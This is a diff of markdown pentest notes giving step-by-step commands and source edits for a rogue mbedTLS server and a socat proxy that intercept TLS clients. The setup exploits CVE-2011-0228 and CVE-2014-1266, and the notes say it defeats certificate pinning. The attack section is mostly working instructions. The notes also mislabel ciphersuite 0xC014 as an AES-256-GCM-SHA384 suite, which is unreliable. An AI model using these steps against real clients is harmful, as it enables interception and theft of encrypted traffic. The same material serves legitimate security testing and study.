@@ -383,23 +383,38 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
        - `sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0` 
 - **mbedTLS**
    - [https://tls.mbed.org](https://tls.mbed.org): SSL library
-   - Allows to create malicious server with invalid certificate chain
-   - Usable to exploit **CVE-2011-0228**, where client does NOT ensure that the parent certificate is a certificate authority
-   - This means a malicious.crt is granted even thoudh it's `valid.parent.crt` is not a CA
-     - This can be verified: `openssl x509 -in valid.parent.crt -text`
-     - Expected output: `X509v3 Basic Constraints: critical` + `CA:FALSE` 
+   - Allows to create malicious server with invalid certificate chain 
    - `wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz`
    - `tar -zxf mbedtls-2.2.1-apache.tgz`
    - `cd mbedtls-2.2.1`
    - `apt-get update && apt-get upgrade`
    - `apt-get install build-essential`
    - `make`
+   - **CVE-2011-0228**
+   - Client does NOT ensure that the parent certificate (of server certifcate) is a certificate authority
+   - This means a malicious.crt is granted even though it's `valid.parent.crt` is not a CA
+     - This can be verified: `openssl x509 -in valid.parent.crt -text`
+     - Expected output: `X509v3 Basic Constraints: critical` + `CA:FALSE`
    - Modify `programs/ssl/ssl_server.c` by using your `myca.pem` and `private.key` from file system + switch listening port to 443
    - Create myca.pem: `cat malicious.crt valid.parent.crt valid.grandparent.crt > /your/path/myca.pem`
    - `ret =  mbedtls_x509_crt_parse_file(&srvcert, "/root/myca.pem");`: Around line 134
    - `ret =  mbedtls_pk_parse_keyfile(&pkey, "/root/mitm.private.key",NULL);`: Around line 150
    - `make`: compile the modified file
    - `./programs/ssl/ssl_server`: if you changed port to 443 you need to run this command as **sudo user**
+   - **CVE-2014-1266**
+   - Valid PEM-chain + Any private key + Vulnerable cipher: TLS Key Exchange Granted
+   - Nutshell: The attacker presents the legitimate certificate but does not own the private key associated with it
+   - This way, even key pinning is bypassed because the presented PEM-chain is valid
+   - Modify `programs/ssl/ssl_server.c` by using a valid PEM-chain + forcing a vulnerable ciphersuite + switch listening port to 443
+   - Download PEM-chain: Go to valid site, click lock-icon in URL bar, "more info", "security", "view certificate", Scroll down, Download `PEM (chain)`
+     - `ret =  mbedtls_x509_crt_parse_file(&srvcert, "/root/myca.pem");`: Around line 134 
+   - Define your own force_ciphersuite in the first lines of the main function
+     - Add `int force_ciphersuite[2];`
+     - Add `force_ciphersuite[0] = 0xC014;`: Stands for **TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384**
+     - Add `mbedtls_ssl_conf_ciphersuites( &conf, force_ciphersuite );`
+   - `make`: compile the modified file
+   - `./programs/ssl/ssl_server`: if you changed port to 443 you need to run this command as **sudo user** 
+
 
 <br />
 
